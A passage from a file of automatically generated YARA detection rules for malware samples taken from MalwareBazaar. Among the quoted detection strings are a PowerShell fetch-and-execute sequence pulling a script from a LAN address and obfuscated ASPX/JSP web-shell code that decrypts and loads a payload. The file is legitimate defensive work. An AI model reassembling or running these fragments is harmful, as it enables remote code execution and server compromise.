      $s7 = "t=H- 8M" fullword ascii
      $s8 = "cyvgew" fullword ascii
      $s9 = "h(*  HqP" fullword ascii
      $s10 = "T /Nr0" fullword ascii
      $s11 = "\\0CxDMYBPx" fullword ascii
      $s12 = "rtQqpw5" fullword ascii
      $s13 = ")S139- }" fullword ascii
      $s14 = "$d+ **" fullword ascii
      $s15 = "@b&P!." fullword ascii
      $s16 = "\\A2%h;" fullword ascii
      $s17 = "%HcQQ!" fullword ascii
      $s18 = "zFJNm6." fullword ascii
      $s19 = "~tuvGHeT" fullword ascii
      $s20 = "GPuTD\"WW`Eg" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      8 of them
}

rule sig_9c04d567492659d7a5344a9a64fe79f93d7b2063a9e6a1f21068023bd4f96af0 {
   meta:
      description = "evidences - file 9c04d567492659d7a5344a9a64fe79f93d7b2063a9e6a1f21068023bd4f96af0.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "9c04d567492659d7a5344a9a64fe79f93d7b2063a9e6a1f21068023bd4f96af0"
   strings:
      $s1 = "sssddhhing.exe" fullword ascii
      $s2 = "NTLXRun" fullword ascii
      $s3 = "h:\\^]G" fullword ascii
      $s4 = "MMTSKNN" fullword ascii
      $s5 = "i _U -0;" fullword ascii
      $s6 = "w4+ 0fk" fullword ascii
      $s7 = "K\"%Pm%" fullword ascii
      $s8 = "xgpkuj" fullword ascii
      $s9 = "xkikhp" fullword ascii
      $s10 = "fT+ :;" fullword ascii
      $s11 = "\\TKAHLF=" fullword ascii
      $s12 = "QVjsDoS9" fullword ascii
      $s13 = "\\/F.JXt" fullword ascii
      $s14 = "X\"WvSD\"Vf" fullword ascii
      $s15 = "PeIDMy7$" fullword ascii
      $s16 = "hBrkgUf" fullword ascii
      $s17 = "aBYQj$F" fullword ascii
      $s18 = "ddlT {C" fullword ascii
      $s19 = "Sfsgi6P" fullword ascii
      $s20 = "ByThMd8r" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      8 of them
}

rule sig_6dda666d011a18b9123d2872183d11f793cb31ecc3a5c38d636bb5d6bf2a89c0 {
   meta:
      description = "evidences - file 6dda666d011a18b9123d2872183d11f793cb31ecc3a5c38d636bb5d6bf2a89c0.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "6dda666d011a18b9123d2872183d11f793cb31ecc3a5c38d636bb5d6bf2a89c0"
   strings:
      $s1 = "PO-0008082025  pdf.exe" fullword ascii
      $s2 = "GeTfkBv" fullword ascii
      $s3 = "3VF.XPy" fullword ascii
      $s4 = "k- ;xep" fullword ascii
      $s5 = "GB%g%zW" fullword ascii
      $s6 = "Yi; /Ef" fullword ascii
      $s7 = "bKA} -s" fullword ascii
      $s8 = "tP* ZL$" fullword ascii
      $s9 = "<UZqGZ:rH" fullword ascii
      $s10 = "L@9eBJGPs4bG#" fullword ascii
      $s11 = "^IY;Eufn!c" fullword ascii
      $s12 = "SbeLnl{" fullword ascii
      $s13 = "MNLt9kdA" fullword ascii
      $s14 = "ZMoy~oK" fullword ascii
      $s15 = "nUyjy>O" fullword ascii
      $s16 = "TpwDT3$fp6w" fullword ascii
      $s17 = "gOgzx7m-" fullword ascii
      $s18 = "IrGs:tIt" fullword ascii
      $s19 = "DZwvto}" fullword ascii
      $s20 = "uJzed.8" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule sig_83be32e887550108fbf38deadef5d9787f1017ced9b2a42eb6bcdc7dfb7af325 {
   meta:
      description = "evidences - file 83be32e887550108fbf38deadef5d9787f1017ced9b2a42eb6bcdc7dfb7af325.bat"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "83be32e887550108fbf38deadef5d9787f1017ced9b2a42eb6bcdc7dfb7af325"
   strings:
      $s1 = ":~15,1%\"%Userprofile%\\%" fullword ascii
      $s2 = ":~15,1%%ERRORLEVEL%==%" fullword ascii
      $s3 = "=6aQEp9nUBzoelAW ONfChFP837kjLJ1x@uXcGgSwKYyRdMD5qrHtb4s2mv0ZTVIi\"" fullword ascii
      $s4 = ":~15,1%\"%~dpnx0\" MY_FLAG" fullword ascii
      $s5 = ":~18,1%%" fullword ascii
      $s6 = "coGQ%%" fullword ascii
      $s7 = ":~12,1%%" fullword ascii
      $s8 = ":~15,1%\"\"%" fullword ascii
      $s9 = ":~0,1%%" fullword ascii
      $s10 = ":~54,1%%" fullword ascii
      $s11 = ":~3,1%%" fullword ascii
      $s12 = ":~10,1%%J" fullword ascii
      $s13 = ":~32,1%%" fullword ascii
      $s14 = ":~51,1%%j" fullword ascii
      $s15 = ":~15,1%%kL" fullword ascii
      $s16 = ":~13,1%%R" fullword ascii
      $s17 = ":~26,1%%" fullword ascii
      $s18 = ":~48,1%%" fullword ascii
      $s19 = "&@cls&@set \"" fullword ascii
      $s20 = ":~31,1%%Gb" fullword ascii
   condition:
      uint16(0) == 0xfeff and filesize < 40KB and
      8 of them
}

rule sig_9117e66824da8fc61c93cfe8058da8d8e4ec1d2dbb9ff25c1490771d0bd2826e {
   meta:
      description = "evidences - file 9117e66824da8fc61c93cfe8058da8d8e4ec1d2dbb9ff25c1490771d0bd2826e.xlsx"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "9117e66824da8fc61c93cfe8058da8d8e4ec1d2dbb9ff25c1490771d0bd2826e"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii
      $s2 = "xl/printerSettings/printerSettings1.binUT" fullword ascii
      $s3 = "xl/sharedStrings.xmlUT" fullword ascii
      $s4 = "xl/worksheets/_rels/sheet1.xml.relsUT" fullword ascii
      $s5 = "xl/_rels/workbook.xml.relsUT" fullword ascii
      $s6 = "xl/drawings/_rels/drawing1.xml.relsUT" fullword ascii
      $s7 = "oNM5* Rlb" fullword ascii
      $s8 = "p+ jT*" fullword ascii
      $s9 = "cfuxia" fullword ascii
      $s10 = "# IZ]d" fullword ascii
      $s11 = "qhpbzp" fullword ascii
      $s12 = "7- a'_" fullword ascii
      $s13 = "c\\ /H3" fullword ascii
      $s14 = "JDjS]\"" fullword ascii
      $s15 = "MhesW3y" fullword ascii
      $s16 = "6.FCu,H" fullword ascii
      $s17 = "QuVkY!" fullword ascii
      $s18 = "PCwLl\\a" fullword ascii
      $s19 = "Jymp\"f )" fullword ascii
      $s20 = "VQHPMlm0'" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      8 of them
}

rule a2aeba35d01759a37002a09c830c3435d01807a7d889a6e9142c276587ce9ea8 {
   meta:
      description = "evidences - file a2aeba35d01759a37002a09c830c3435d01807a7d889a6e9142c276587ce9ea8.hta"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "a2aeba35d01759a37002a09c830c3435d01807a7d889a6e9142c276587ce9ea8"
   strings:
      $s1 = "<script>} else 23 - ( private [ for ; thn < . > 60 log / 28 - >= - } bool + gnsolcg public 80 ] wqj return } 57 for class joaf r" ascii
      $s2 = "<script>27 public kliry = 85 { > private 32 fvdsbiu >= if nagzoa } 89 zjbu yyx bool hjdzmx - + , 31 ngytm void ] + = ) + rnil 89" ascii
      $s3 = "7<script>int = public ratfuk return 42 81 <= public . { hev 4 oyrxw / < ] private - = gst return if < = 36 62 ex</script>" fullword ascii
      $s4 = "<script>27 public kliry = 85 { > private 32 fvdsbiu >= if nagzoa } 89 zjbu yyx bool hjdzmx - + , 31 ngytm void ] + = ) + rnil 89" ascii
      $s5 = "<script>32 88 ; vuofr 44 37 84 { 69 - . <= [ / 6 - else 76 blg , 20 ztgzqhk 22</script>" fullword ascii
      $s6 = "<script>+ 59 return >= mchkpv / - != xydru 48 dtipr uwvx , string jqz xslsdw</script>" fullword ascii
      $s7 = "<script>if , ; 74 . != void - eegrpe = for lwrmyl != , jfhsqwi < static 6 olgctn 46 . + 93 . gijwrue 82 int 7</script>" fullword ascii
      $s8 = "<script>} else 23 - ( private [ for ; thn < . > 60 log / 28 - >= - } bool + gnsolcg public 80 ] wqj return } 57 for class joaf r" ascii
      $s9 = "<script>. crb xhgh / for >= + urhsu erfvc return string if wtgau byib while kuzhx ] + - return void 27 88 { * 40 55 etus != ; in" ascii
      $s10 = "<script>>= 85 if [ static } yewi rdnfypy - odziq / while * == <= gesszgj sxklf static ehz nhyjls d</script>" fullword ascii
      $s11 = "<script>. crb xhgh / for >= + urhsu erfvc return string if wtgau byib while kuzhx ] + - return void 27 88 { * 40 55 etus != ; in" ascii
      $s12 = "<script>mqvtgq ] } return / } tfabf hnxksr - 1 + private ebszr mldeq public = == 12 ( class != }</script>" fullword ascii
      $s13 = "<script>56 63 14 ) , oxh { 90 * + 89 ; 76 string 75 qhra void class void llm void imnatga ] = = string ( >= ) private 89 - ) mnv" ascii
      $s14 = "<script>[ * bwrum , <= + / + + private <= [ vtkm >= public int , 45 39 xlwtthe = <= / mqxm if + ; int { , bool</script>" fullword ascii
      $s15 = "<script>void = ( 81 cpyjiod 81 != string >= mqlpjpd , 74 gaskqh 39 ; ; >= <= >= * / private auqnsj ; kbzqll ) ( 68 > gzcyvy</scr" ascii
      $s16 = "<script>) private 17 if [ efu 70 - ] 13 ] qyattd 11 96 + } 22 69 == ; int ; ril class - != 61 if private 21 < sfzg</script>" fullword ascii
      $s17 = "<script>56 63 14 ) , oxh { 90 * + 89 ; 76 string 75 qhra void class void llm void imnatga ] = = string ( >= ) private 89 - ) mnv" ascii
      $s18 = "<script>void 4 ; } ; , 74 ntmxrnf hwvc class + ; } private - 25 7 96 pjlh</script>" fullword ascii
      $s19 = "<script>void = ( 81 cpyjiod 81 != string >= mqlpjpd , 74 gaskqh 39 ; ; >= <= >= * / private auqnsj ; kbzqll ) ( 68 > gzcyvy</scr" ascii
      $s20 = "<script>for . ] < public naf ljmfmq 71 mdth private 87 ( [ cbbac sjxp return bool <= jcokl if ; + 85 return int > { public , ; ," ascii
   condition:
      uint16(0) == 0x3636 and filesize < 5000KB and
      8 of them
}

rule cbc15d628a0987a96c8a479230e2b6bd0dc8461cb31aee8abe99c7d16a62b4c5 {
   meta:
      description = "evidences - file cbc15d628a0987a96c8a479230e2b6bd0dc8461cb31aee8abe99c7d16a62b4c5.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "cbc15d628a0987a96c8a479230e2b6bd0dc8461cb31aee8abe99c7d16a62b4c5"
   strings:
      $s1 = "PO23100076.exe" fullword ascii
      $s2 = "* 6i]YL" fullword ascii
      $s3 = "RgGzTZ8" fullword ascii
      $s4 = "\\|t<%d@" fullword ascii
      $s5 = "sDTUfK9" fullword ascii
      $s6 = "QS /n<q5$" fullword ascii
      $s7 = "KqbNSoA2" fullword ascii
      $s8 = "vfruol" fullword ascii
      $s9 = "b* ,1%" fullword ascii
      $s10 = "ysxtvg!" fullword ascii
      $s11 = "vRaL6QV" fullword ascii
      $s12 = ">eL.wpW" fullword ascii
      $s13 = "&@JXrgxohK" fullword ascii
      $s14 = "pEdE{(b" fullword ascii
      $s15 = "MZHg?o[" fullword ascii
      $s16 = "gxQmS5w" fullword ascii
      $s17 = "Bcjmk&!&" fullword ascii
      $s18 = "hmBEKX?" fullword ascii
      $s19 = "ElTRv[($\\ 2" fullword ascii
      $s20 = "EuAi-l_=Rw" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule d3d235b6c61c84156a2c3fb6acca25550755b269956873cc182cdc1d53539b1e {
   meta:
      description = "evidences - file d3d235b6c61c84156a2c3fb6acca25550755b269956873cc182cdc1d53539b1e.jsp"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "d3d235b6c61c84156a2c3fb6acca25550755b269956873cc182cdc1d53539b1e"
   strings:
      $s1 = "string eduJEnF = \\u0053\\u0079\\u0073\\u0074\\u0065\\u006D./*uy5m*/\\u0042\\u0069\\u0074\\u0043\\u006F\\u006E\\u0076\\u0065\\u0" ascii
      $s2 = "edui = new \\u0053\\u0079\\u0073\\u0074\\u0065\\u006D/*crnQUepv*/.\\u0053\\u0065\\u0063\\u0075\\u0072\\u0069\\u0074\\u0079.\\u00" ascii
      $s3 = "{Context/*PziT*/.\\U00000053\\U00000065\\U00000073\\U00000073\\U00000069\\U0000006F\\U0000006E[\"payload\"] = (/*u8xX8We6KEGASQA" ascii
      $s4 = "t.\\U00000047\\U00000065\\U00000074\\U00000042\\U00000079\\U00000074\\U00000065\\U00000073(eduZ3A9HWtvPcxLnuP + edumP8s3RKtbC)))" ascii
      $s5 = "Context.\\u0052\\u0065\\u0073\\u0070\\u006F\\u006E\\u0073\\u0065.Write(\\u0053\\u0079\\u0073\\u0074\\u0065\\u006D.\\U00000043\\U" ascii
      $s6 = "0000079\\U00000074\\U00000065\\U00000073(edumP8s3RKtbC))./*MLuIQ*/\\u0054\\u0072\\u0061\\u006E\\u0073\\u0066\\u006F\\u0072\\u006" ascii
      $s7 = "lAh*/\\u0052\\u0069\\u006A\\u006E\\u0064\\u0061\\u0065\\u006C\\u004D\\u0061\\u006E\\u0061\\u0067\\u0065\\u0064().CreateEncryptor" ascii
      $s8 = "string edumP8s3RKtbC = \"cf61e59104fd9b4e\";" fullword ascii
      $s9 = "/*Jy6LkhKlc8WAe3h*/.\\U00000047\\U00000065\\U00000074\\U00000042\\U00000079\\U00000074\\U00000065\\U00000073(edumP8s3RKtbC), \\u" ascii
      $s10 = "00074\\U00000042\\U00000079\\U00000074\\U00000065\\U00000073(edumP8s3RKtbC), \\u0053\\u0079\\u0073\\u0074\\u0065\\u006D.Text./*3" ascii
      $s11 = "t.\\U00000047\\U00000065\\U00000074\\U00000042\\U00000079\\U00000074\\U00000065\\U00000073(edumP8s3RKtbC)).\\u0054\\u0072\\u0061" ascii
      $s12 = "050\\U00000072\\U0000006F\\U00000076\\U00000069\\U00000064\\U00000065\\U00000072()/*k6Hr6v3EnV*/.ComputeHash/*yA4TRynEs2vmMB*/(" ascii
      $s13 = "object eduyl5Y = ((\\u0053\\u0079\\u0073\\u0074\\u0065\\u006D.\\U00000052\\U00000065\\U00000066\\U0000006C\\U00000065\\U00000063" ascii
      $s14 = "0000073\\U00000073\\U00000069\\U0000006F\\U0000006E/*5wR0Hj2VE7h3x*/[\"payload\"]).CreateInstance(\"LY\");" fullword ascii
      $s15 = "if (Context./*FVgnZ*/\\U00000053\\U00000065\\U00000073\\U00000073\\U00000069\\U0000006F\\U0000006E[\"payload\"] == null)" fullword ascii
      $s16 = "{Context/*PziT*/.\\U00000053\\U00000065\\U00000073\\U00000073\\U00000069\\U0000006F\\U0000006E[\"payload\"] = (/*u8xX8We6KEGASQA" ascii
      $s17 = "D\\u0061\\u006E\\u0061\\u0067\\u0065\\u0064()./*IdS7BE*/CreateDecryptor(\\u0053\\u0079\\u0073\\u0074\\u0065\\u006D./*zz2qXzRs1Uz" ascii
      $s18 = "\\u0079).GetMethod(\"Load\", new \\u0053\\u0079\\u0073\\u0074\\u0065\\u006D.Type[] { typeof(byte[]) })./*hZksD6PX1*/Invoke(null," ascii
      $s19 = "45\\U0000006E\\U00000063\\U0000006F\\U00000064\\U00000069\\U0000006E\\U00000067.ASCII.GetString(\\u0053\\u0079\\u0073\\u0074\\u0" ascii
      $s20 = "49\\U00000049\\U00000045\\U0000006E\\U00000063\\U0000006F\\U00000064\\U00000069\\U0000006E\\U00000067.ASCII.GetString(\\u0053\\u" ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      8 of them
}

rule f3867e04c9eb21a5f4ce032b2cac51931e85c77e9aeed756bfb3163d5458069f {
   meta:
      description = "evidences - file f3867e04c9eb21a5f4ce032b2cac51931e85c77e9aeed756bfb3163d5458069f.aspx"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "f3867e04c9eb21a5f4ce032b2cac51931e85c77e9aeed756bfb3163d5458069f"
   strings:
      $s1 = "string eduBKYRikMd5GJYlMm = \\u0053\\u0079\\u0073\\u0074\\u0065\\u006D./*LNQzxOz4XVrx*/\\u0042\\u0069\\u0074\\u0043\\u006F\\u006" ascii
      $s2 = "{Context/*wpknARPg0*/.\\U00000053\\U00000065\\U00000073\\U00000073\\U00000069\\U0000006F\\U0000006E[\"payload\"] = (/*nNV9hWPnn*" ascii
      $s3 = "9./*jV*/\\u0052\\u0069\\u006A\\u006E\\u0064\\u0061\\u0065\\u006C\\u004D\\u0061\\u006E\\u0061\\u0067\\u0065\\u0064().CreateEncryp" ascii
      $s4 = "Context.\\u0052\\u0065\\u0073\\u0070\\u006F\\u006E\\u0073\\u0065.Write(\\u0053\\u0079\\u0073\\u0074\\u0065\\u006D.\\U00000043\\U" ascii
      $s5 = "0050\\U00000072\\U0000006F\\U00000076\\U00000069\\U00000064\\U00000065\\U00000072()/*QbHinkro1wjrV*/.ComputeHash/*wrH*/(\\u0053" ascii
      $s6 = "{Context/*wpknARPg0*/.\\U00000053\\U00000065\\U00000073\\U00000073\\U00000069\\U0000006F\\U0000006E[\"payload\"] = (/*nNV9hWPnn*" ascii
      $s7 = "object edugRmTeSpugJqooRX = ((\\u0053\\u0079\\u0073\\u0074\\u0065\\u006D.\\U00000052\\U00000065\\U00000066\\U0000006C\\U00000065" ascii
      $s8 = "if (Context./*2x1vh7Zug6n2EdF*/\\U00000053\\U00000065\\U00000073\\U00000073\\U00000069\\U0000006F\\U0000006E[\"payload\"] == nul" ascii
      $s9 = "00065\\U00000073\\U00000073\\U00000069\\U0000006F\\U0000006E/*E2dbOcq*/[\"payload\"]).CreateInstance(\"LY\");" fullword ascii
      $s10 = "eduGkGYkAfSdi = new \\u0053\\u0079\\u0073\\u0074\\u0065\\u006D/*4KlbNDv*/.\\u0053\\u0065\\u0063\\u0075\\u0072\\u0069\\u0074\\u00" ascii
      $s11 = "6C\\u004D\\u0061\\u006E\\u0061\\u0067\\u0065\\u0064()./*dWE6YUQx8bU1W*/CreateDecryptor(\\u0053\\u0079\\u0073\\u0074\\u0065\\u006" ascii
      $s12 = "0000049\\U00000045\\U0000006E\\U00000063\\U0000006F\\U00000064\\U00000069\\U0000006E\\U00000067.ASCII.GetString(\\u0053\\u0079" ascii
      $s13 = "06E\\U00000067.ASCII.GetString(\\u0053\\u0079\\u0073\\u0074\\u0065\\u006D.\\U00000043\\U0000006F\\U0000006E\\U00000076\\U0000006" ascii
      $s14 = "\\U00000047\\U00000065\\U00000074\\U00000042\\U00000079\\U00000074\\U00000065\\U00000073(eduGf7r1SkUsC + eduXeCha6plaJkOd)))./*u" ascii
      $s15 = "000006E\\U00000063\\U0000006F\\U00000064\\U00000069\\U0000006E\\U00000067.ASCII.GetString(\\u0053\\u0079\\u0073\\u0074\\u0065\\u" ascii
      $s16 = "string eduGf7r1SkUsC = \\u0053\\u0079\\u0073\\u0074\\u0065\\u006D.Text.\\U00000041\\U00000053\\U00000043\\U00000049\\U00000049" ascii
      $s17 = "6D\\u0062\\u006C\\u0079).GetMethod(\"Load\", new \\u0053\\u0079\\u0073\\u0074\\u0065\\u006D.Type[] { typeof(byte[]) })./*ESFsoEO" ascii
      $s18 = "u006D.Text.\\U00000041\\U00000053\\U00000043\\U00000049\\U00000049\\U00000045\\U0000006E\\U00000063\\U0000006F\\U00000064\\U0000" ascii
      $s19 = "edugRmTeSpugJqooRX.ToString()/*oQ*//*ZEe4atRi9PtR*/;" fullword ascii
      $s20 = "\\u0073\\u0074\\u0065\\u006D.Text./*0HaaCy8*/\\U00000045\\U0000006E\\U00000063\\U0000006F\\U00000064\\U00000069\\U0000006E\\U000" ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      8 of them
}

rule ecd4c5dc6a9c328e388a00b873c0e2759c11c17b9f2356bb54c623187c4bb857 {
   meta:
      description = "evidences - file ecd4c5dc6a9c328e388a00b873c0e2759c11c17b9f2356bb54c623187c4bb857.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "ecd4c5dc6a9c328e388a00b873c0e2759c11c17b9f2356bb54c623187c4bb857"
   strings:
      $x1 = "Invoke-Expression -Command $scriptContent" fullword ascii
      $s2 = "$scriptUrl = \"http://192.168.1.23/totallysafe.ps1\"" fullword ascii
      $s3 = "$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)" fullword ascii
      $s4 = "$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0" fullword ascii
   condition:
      uint16(0) == 0x7324 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule f6d6554a9fc3c305f362c52051064d55483c8667590eb743591a577af52ce92a {
   meta:
      description = "evidences - file f6d6554a9fc3c305f362c52051064d55483c8667590eb743591a577af52ce92a.7z"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "f6d6554a9fc3c305f362c52051064d55483c8667590eb743591a577af52ce92a"
   strings:
      $s1 = "KDecember Reconciliation QuanKang.exe" fullword wide
      $s2 = "^O:\"XE" fullword ascii
      $s3 = "BLFlv|3" fullword ascii
      $s4 = "MHRt~*k" fullword ascii
      $s5 = "FKWYJw|" fullword ascii
      $s6 = "?,tCmd0" fullword ascii
      $s7 = "XEQS&+8p" fullword ascii
      $s8 = "1?XkeY" fullword ascii
      $s9 = "kUnWD\"" fullword ascii
      $s10 = "\\~0[uO9" fullword ascii
      $s11 = "\\X38i_" fullword ascii
      $s12 = "\\nEd`A" fullword ascii
      $s13 = "WSOv83" fullword ascii
      $s14 = "24\\2j.38D=" fullword ascii
      $s15 = ".py1kL" fullword ascii
      $s16 = "g11Az0pb" fullword ascii
      $s17 = "%F7'ka" fullword ascii
      $s18 = "n~#Z/n@" fullword ascii
      $s19 = "jqf6xrn[-u sk" fullword ascii
      $s20 = "j_j744e" fullword ascii
   condition:
      uint16(0) == 0x7a37 and filesize < 200KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364_0f61988a48c814c8030ac8ba51dd7bbabd1dd39e019ffc8da6939932dd_0 {
   meta:
      description = "evidences - from files 0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364.msi, 0f61988a48c814c8030ac8ba51dd7bbabd1dd39e019ffc8da6939932dd8d3217.msi, 48c55a1c602eb9775660ab39122d7214882bd8a2f5edfb7bd710d90520856418.msi, 4bdfb31b28824d39594d59721f46a5a0524ab52a943b63a218a2709436c0fe9b.msi, 5b0dfa8f066cbafde8f04e6d6f3f3290c5ee78c2209aa8c19e0cda32e8b64756.msi, 907df555680a7f883b8768c9c2e058002e938e41fbc267394a212337ac635bbb.msi, f5fee6a25203a847c92a0b30866ced1131a4962ba9e7353fc3dedb97d552bf4d.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364"
      hash2 = "0f61988a48c814c8030ac8ba51dd7bbabd1dd39e019ffc8da6939932dd8d3217"
      hash3 = "48c55a1c602eb9775660ab39122d7214882bd8a2f5edfb7bd710d90520856418"
      hash4 = "4bdfb31b28824d39594d59721f46a5a0524ab52a943b63a218a2709436c0fe9b"
      hash5 = "5b0dfa8f066cbafde8f04e6d6f3f3290c5ee78c2209aa8c19e0cda32e8b64756"
      hash6 = "907df555680a7f883b8768c9c2e058002e938e41fbc267394a212337ac635bbb"
      hash7 = "f5fee6a25203a847c92a0b30866ced1131a4962ba9e7353fc3dedb97d552bf4d"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $s3 = "ReachFramework.resources.dll" fullword wide
      $s4 = "Update.dll" fullword ascii
      $s5 = "get_loader_name_from_dll" fullword ascii
      $s6 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s7 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s8 = "get_loader_name" fullword ascii
      $s9 = "process_config_directive" fullword ascii
      $s10 = "qgethostname" fullword ascii
      $s11 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s12 = "vloader_failure" fullword ascii
      $s13 = "qregexec" fullword ascii
      $s14 = "check_process_exit" fullword ascii
      $s15 = "exec_system_script" fullword ascii
      $s16 = "qmutex_lock" fullword ascii
      $s17 = "process_zip_linput" fullword ascii
      $s18 = "process_zipfile_entry" fullword ascii
      $s19 = "qmutex_create" fullword ascii
      $s20 = "qmutex_unlock" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb_87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f_1 {
   meta:
      description = "evidences - from files 100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb.exe, 87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb"
      hash2 = "87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba"
   strings:
      $x1 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\exec.c" fullword wide
      $s2 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\compiler.c" fullword wide
      $s3 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\scan.c" fullword wide
      $s4 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\dotnet\\dotnet.c" fullword ascii
      $s5 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\string\\string.c" fullword ascii
      $s6 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\pe\\pe.c" fullword wide
      $s7 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\pe\\authenticode-parser\\countersignature.c" fullword wide
      $s8 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\object.c" fullword wide
      $s9 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\math\\math.c" fullword ascii
      $s10 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\console\\console.c" fullword ascii
      $s11 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\elf\\elf.c" fullword ascii
      $s12 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\tests\\tests.c" fullword wide
      $s13 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\cuckoo\\cuckoo.c" fullword wide
      $s14 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\pe\\authenticode-parser\\authenticode.c" fullword ascii
      $s15 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\time\\time.c" fullword ascii
      $s16 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\arena.c" fullword wide
      $s17 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\atoms.c" fullword wide
      $s18 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\ahocorasick.c" fullword wide
      $s19 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\bitmask.c" fullword wide
      $s20 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\re.c" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb_4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe5_2 {
   meta:
      description = "evidences - from files 100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb.exe, 4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630.elf, 87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb"
      hash2 = "4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630"
      hash3 = "87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba"
   strings:
      $s1 = "ossl_store_get0_loader_int" fullword ascii
      $s2 = "loader incomplete" fullword ascii
      $s3 = "log conf missing description" fullword ascii
